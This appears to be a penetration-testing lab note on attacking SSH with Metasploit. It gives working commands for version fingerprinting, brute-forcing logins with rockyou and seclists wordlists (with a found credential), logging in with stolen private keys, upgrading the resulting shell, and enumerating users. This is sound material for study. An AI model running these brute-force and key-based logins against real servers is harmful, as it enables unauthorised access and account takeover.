## Overview

- **SSH (Secure Shell)**: Encrypted remote administration protocol (successor to Telnet).
- **Default Port**: `22/TCP` (can be changed).
- Provides secure command-line access to servers.
- **Traffic is encrypted** â†’ immune to eavesdropping and MITM (unlike Telnet).

---
## Step-by-Step Workflow

### 1. Set Target Globally
```msf
setg RHOSTS 192.168.1.10
setg RHOST 192.168.1.10
```

### 2. Enumerate SSH Version
```msf
use auxiliary/scanner/ssh/ssh_version
run
```

â†’ Returns:
- Exact **SSH server version** (e.g., `OpenSSH 8.2p1`)
- **OS fingerprint** (e.g., `Ubuntu Linux`)

> ğŸ” Helps identify known vulnerabilities (e.g., CVE-2020-14145 in OpenSSH < 8.3).

---
### 3. Brute-Force Credentials

#### a) Password-Based Login
```msf
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

âœ… Success: `sysadmin:hailey`

> ğŸ’¡ A **Meterpreter session is NOT created** â€” but a **shell session** is opened.

#### b) Public Key Authentication (Advanced)
```msf
search ssh_login_pubkey
```

- **`ssh_login`**: Tries username + password combos.
- **`ssh_login_pubkey`**: Tries to authenticate using **SSH private keys** (e.g., from compromised systems).

> ğŸ“Œ Use `ssh_login_pubkey` only if you have stolen `.ssh/id_rsa` files.

---
### 4. Interact with Session

```msf
sessions               # List active sessions
sessions -i 1          # Connect to session 1
```

Inside session:
```sh
/bin/bash -i           # Upgrade to interactive shell (Linux)
whoami                 # Confirm user
id                     # Check groups/privileges
exit                   # Exit shell
```

Back in `msfconsole`:
```msf
sessions -k 1          # Kill session (or just exit from shell)
```

---
### 5. Enumerate Valid Users (If Brute-Force Fails)

```msf
use auxiliary/scanner/ssh/ssh_enumusers
set USER_FILE users.txt
run
```

> âš ï¸ Only works on **older OpenSSH versions** (< 7.7) â€” modern versions disable user enumeration by default.

---
### Key Notes

- SSH brute-forcing is **noisy** and may trigger account lockouts.
- Always try **default/weak credentials first** before large wordlists.
- Successful login = **full remote shell access** (equivalent to local terminal).
- All sessions are tracked in Metasploit â†’ use `sessions` to manage them.